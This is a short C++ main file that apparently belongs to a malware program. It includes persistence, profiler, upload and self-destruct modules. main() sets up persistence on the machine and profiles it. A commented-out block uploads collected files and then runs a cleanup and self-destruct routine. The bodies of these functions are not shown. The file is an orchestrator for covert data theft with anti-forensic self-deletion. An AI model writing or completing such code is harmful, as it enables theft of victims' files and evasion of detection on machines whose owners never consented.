#include "Core/upload.hpp"
#include "Core/self_destruct.hpp"
#include "Core/persistence.hpp"
#include "Core/profiler.hpp"



constexpr bool ONETIMERUN = true;


void CleanupAndDestroy() {
    std::cout << "Beginning cleanup..." << std::endl;
    std::this_thread::sleep_for(std::chrono::seconds(5));
    Cleanup();
    std::this_thread::sleep_for(std::chrono::seconds(3));
    SelfDestruct();
}


int main() {
    std::cout << "Running main function" << std::endl;
    PersistOnMachine();
    std::cout << "- Before calling profiler() function" << std::endl;
    Profiler();
    std::cout << "+ After calling profiler() function" << std::endl;

    /*
    // Mode 1: run once and then > cleanup > self destruct
    if (ONETIMERUN) {
        std::cout << "Running file upload" << std::endl;
        ProcessFilesAndUpload();
        
        CleanupAndDestroy();
    }

    // This code might never see the light of the day but I gonna keep here anyways...
    CleanupAndDestroy();
    */
    return 0;
}

